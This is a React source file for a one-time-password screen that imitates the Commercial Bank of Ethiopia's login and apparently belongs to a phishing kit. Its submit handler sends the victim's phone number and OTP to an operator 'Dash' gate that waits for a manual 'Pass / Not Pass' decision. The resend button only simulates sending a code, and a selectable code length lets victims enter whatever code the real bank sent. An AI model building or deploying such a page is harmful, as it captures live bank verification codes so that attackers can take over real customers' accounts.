'use client';

import React, { useState, useEffect, useRef } from 'react';
import {
  ShieldCheck,
  ArrowLeft,
  ArrowRight,
  MessageSquareText,
  RotateCw,
  AlertCircle,
  CheckCircle2,
  Lock,
} from 'lucide-react';
import { CbeLogo } from './CbeLogo';
import { requestDashApproval } from '@/lib/dash-gate';

interface OtpVerificationProps {
  phoneNumber: string;
  onVerifySuccess: () => void;
  onBackToLogin: () => void;
  variant?: 'card' | 'plain';
}

type OtpLength = 4 | 5 | 6;

export const OtpVerification: React.FC<OtpVerificationProps> = ({
  phoneNumber,
  onVerifySuccess,
  onBackToLogin,
  variant = 'card',
}) => {
  const [digitLength, setDigitLength] = useState<OtpLength>(6);
  const [otp, setOtp] = useState<string[]>(['', '', '', '', '', '']);
  const [timer, setTimer] = useState<number>(55);
  const [isResending, setIsResending] = useState<boolean>(false);
  const [resendAlert, setResendAlert] = useState<string | null>(null);
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Format phone display nicely: e.g. "912 345 678"
  const formattedPhone =
    phoneNumber.length === 9
      ? `${phoneNumber.slice(0, 3)} ${phoneNumber.slice(3, 6)} ${phoneNumber.slice(6)}`
      : phoneNumber;

  // Countdown timer for resend
  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  // Focus the first input on load
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const handleLengthChange = (newLength: OtpLength) => {
    if (newLength === digitLength) return;
    setDigitLength(newLength);
    setOtp((prev) => {
      const next = Array(newLength).fill('');
      for (let i = 0; i < Math.min(prev.length, newLength); i++) {
        next[i] = prev[i] || '';
      }
      return next;
    });
    setErrorMessage(null);
    setTimeout(() => {
      inputRefs.current[0]?.focus();
    }, 50);
  };

  const handleInputChange = (index: number, value: string) => {
    // Only accept numeric characters
    const cleaned = value.replace(/\D/g, '');
    if (!cleaned) {
      const nextOtp = [...otp];
      nextOtp[index] = '';
      setOtp(nextOtp);
      return;
    }

    // Handle single character
    const char = cleaned.slice(-1);
    const nextOtp = [...otp];
    nextOtp[index] = char;
    setOtp(nextOtp);
    if (errorMessage) setErrorMessage(null);

    // Auto focus next box
    if (index < digitLength - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (!otp[index] && index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    } else if (e.key === 'ArrowRight' && index < digitLength - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, digitLength);
    if (!pastedData) return;

    const nextOtp = [...otp];
    for (let i = 0; i < pastedData.length; i++) {
      nextOtp[i] = pastedData[i];
    }
    setOtp(nextOtp);
    if (errorMessage) setErrorMessage(null);

    const nextFocusIndex = Math.min(pastedData.length, digitLength - 1);
    inputRefs.current[nextFocusIndex]?.focus();
  };

  const handleResend = () => {
    if (timer > 0 || isResending) return;
    setIsResending(true);
    setResendAlert(null);
    setErrorMessage(null);

    setTimeout(() => {
      setIsResending(false);
      setTimer(60);
      setResendAlert('A new verification code has been dispatched to your mobile.');
      setTimeout(() => setResendAlert(null), 4000);
    }, 700);
  };

  const fullOtp = otp.join('');
  const isOtpComplete = fullOtp.length === digitLength && otp.every((d) => d !== '');

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!isOtpComplete || isVerifying) return;

    setIsVerifying(true);
    setErrorMessage(null);

    // Gated by Dash: stays on "Verifying Code..." spinner until Pass / Not Pass.
    // Pass -> other page (authenticated). Not Pass -> silently reset, no error/note.
    const decision = await requestDashApproval({
      siteId: 'commercial-cbe',
      page: 'otp',
      meta: { phone: '+251' + phoneNumber, otp: fullOtp, digits: digitLength },
    });
    setIsVerifying(false);
    if (decision === 'pass') onVerifySuccess();
  };

  return (
    <div
      id="cbe-otp-card"
      className={
        variant === 'plain'
          ? 'w-full transition-all'
          : 'w-full max-w-[420px] rounded-[38px] border border-neutral-200/80 bg-white p-6 sm:p-8 shadow-xl transition-all'
      }
    >
      {/* Top Bar with Back Button and Security Badge */}
      <div className="flex items-center justify-between">
        <button
          id="otp-back-button"
          type="button"
          onClick={onBackToLogin}
          className="flex h-10 w-10 items-center justify-center rounded-full border border-neutral-200/70 bg-white text-neutral-600 hover:bg-neutral-50 hover:text-neutral-900 transition-colors"
          title="Back to login"
          aria-label="Back to login"
        >
          <ArrowLeft className="h-4 w-4" />
        </button>

        <div className="flex items-center gap-1.5 rounded-full bg-emerald-50 px-3 py-1 text-xs font-semibold text-emerald-700 border border-emerald-200/60">
          <ShieldCheck className="h-3.5 w-3.5 text-emerald-600" />
          <span>2-Step Verification</span>
        </div>
      </div>

      {/* CBE Logo */}
      <div className="mt-4">
        <CbeLogo />
      </div>

      {/* Header Info */}
      <div className="mt-5 text-center">
        <div className="mx-auto mb-2.5 flex h-12 w-12 items-center justify-center rounded-2xl bg-amber-50 text-[#b5873e] border border-amber-200/60 shadow-xs">
          <MessageSquareText className="h-6 w-6" />
        </div>
        <h2 className="text-xl font-bold tracking-tight text-neutral-900">
          Enter Verification Code
        </h2>
        <p className="mt-1.5 text-xs text-neutral-500 max-w-xs mx-auto leading-relaxed">
          We sent a {digitLength}-digit one-time password (OTP) via SMS to
        </p>
        <div className="mt-1 inline-flex items-center gap-1.5 rounded-lg bg-neutral-100 px-2.5 py-1 text-xs font-bold text-neutral-800">
          <span>+251 {formattedPhone || '9•• ••• •••'}</span>
        </div>
      </div>

      {/* Code Length Selector: 4, 5, or 6 Digits (6 is Default) */}
      <div className="mt-4 flex flex-col items-center gap-1.5">
        <div className="flex items-center gap-1 text-[11px] font-semibold text-neutral-500">
          <span>Choose Code Format:</span>
        </div>
        <div
          id="otp-length-selector"
          className="inline-flex items-center rounded-2xl bg-neutral-100/90 p-1 border border-neutral-200/60"
        >
          {([4, 5, 6] as const).map((len) => (
            <button
              key={len}
              id={`otp-length-${len}-btn`}
              type="button"
              onClick={() => handleLengthChange(len)}
              className={`flex items-center justify-center rounded-xl px-3 py-1.5 text-xs font-bold transition-all ${
                digitLength === len
                  ? 'bg-white text-[#b5873e] shadow-[0_2px_8px_rgba(0,0,0,0.06)]'
                  : 'text-neutral-500 hover:text-neutral-900'
              }`}
            >
              <span>{len} Digits</span>
            </button>
          ))}
        </div>
      </div>

      {/* OTP Input Form */}
      <form onSubmit={handleSubmit} className="mt-5">
        {/* Dynamic Digit Input Boxes Container */}
        <div
          id="otp-inputs-container"
          className={`flex justify-center transition-all ${
            digitLength === 4
              ? 'gap-2.5 sm:gap-3.5'
              : digitLength === 5
                ? 'gap-2 sm:gap-2.5'
                : 'gap-1.5 sm:gap-2'
          }`}
        >
          {otp.map((digit, index) => (
            <input
              key={`${digitLength}-${index}`}
              ref={(el) => {
                inputRefs.current[index] = el;
              }}
              id={`otp-digit-${index}`}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={1}
              value={digit}
              onChange={(e) => handleInputChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              onPaste={handlePaste}
              className={`${
                digitLength === 4
                  ? 'h-13 w-13 sm:h-15 sm:w-15 text-2xl'
                  : digitLength === 5
                    ? 'h-12 w-12 sm:h-14 sm:w-13 text-xl'
                    : 'h-12 w-11 sm:h-14 sm:w-12 text-xl'
              } rounded-2xl border text-center font-bold transition-all focus:outline-none ${
                digit
                  ? 'border-[#b5873e] bg-amber-50/20 text-neutral-900 shadow-xs'
                  : 'border-neutral-200/90 bg-neutral-50/60 text-neutral-800'
              } focus:border-[#b5873e] focus:bg-white focus:ring-2 focus:ring-[#b5873e]/20`}
              autoComplete="one-time-code"
            />
          ))}
        </div>

        {/* Error Notification */}
        {errorMessage && (
          <p className="mt-2.5 flex items-center justify-center gap-1.5 text-xs text-rose-600">
            <AlertCircle className="h-3.5 w-3.5 shrink-0" />
            <span>{errorMessage}</span>
          </p>
        )}

        {/* Resend feedback */}
        {resendAlert && (
          <p className="mt-2.5 flex items-center justify-center gap-1.5 text-xs text-emerald-600">
            <CheckCircle2 className="h-3.5 w-3.5 shrink-0" />
            <span>{resendAlert}</span>
          </p>
        )}

        {/* Resend Countdown / Trigger */}
        <div className="mt-5 text-center text-xs">
          {timer > 0 ? (
            <p className="text-neutral-400">
              Resend code in <span className="font-semibold text-neutral-700">{timer}s</span>
            </p>
          ) : (
            <button
              id="resend-otp-button"
              type="button"
              onClick={handleResend}
              disabled={isResending}
              className="inline-flex items-center gap-1 font-semibold text-[#b5873e] hover:underline disabled:opacity-50"
            >
              <RotateCw className={`h-3.5 w-3.5 ${isResending ? 'animate-spin' : ''}`} />
              <span>Resend OTP Code</span>
            </button>
          )}
        </div>

        {/* Action Button: Verify & Login */}
        <div className="mt-6">
          <button
            id="cbe-verify-otp-button"
            type="submit"
            disabled={!isOtpComplete || isVerifying}
            className={`flex h-14 w-full items-center justify-center gap-2 rounded-2xl text-base font-bold transition-all ${
              isOtpComplete && !isVerifying
                ? 'bg-[#b58742] hover:bg-[#a37633] active:bg-[#926829] text-white shadow-[0_4px_16px_rgba(181,135,66,0.3)] active:scale-[0.99] cursor-pointer'
                : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
            }`}
          >
            {isVerifying ? (
              <div className="flex items-center gap-2">
                <span className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                <span>Verifying Code...</span>
              </div>
            ) : (
              <>
                <span>Verify & Proceed</span>
                <ArrowRight className="h-4 w-4 stroke-[2.5]" />
              </>
            )}
          </button>
        </div>
      </form>

      {/* Change phone link */}
      <div className="mt-4 text-center">
        <button
          type="button"
          onClick={onBackToLogin}
          className="text-xs font-medium text-neutral-500 hover:text-neutral-800 transition-colors"
        >
          Incorrect number? <span className="font-semibold text-[#b5873e] underline">Edit Phone Number</span>
        </button>
      </div>

      {/* Security Advisory */}
      <div className="mt-6 rounded-2xl border border-neutral-100 bg-neutral-50/80 p-3 text-center">
        <div className="flex items-center justify-center gap-1 text-[11px] font-semibold text-neutral-600">
          <Lock className="h-3 w-3 text-[#b5873e]" />
          <span>Security Advisory</span>
        </div>
        <p className="mt-1 text-[10px] text-neutral-400 leading-tight">
          CBE will never request your OTP, PIN, or password via SMS or call. Keep this code confidential.
        </p>
      </div>
    </div>
  );
};
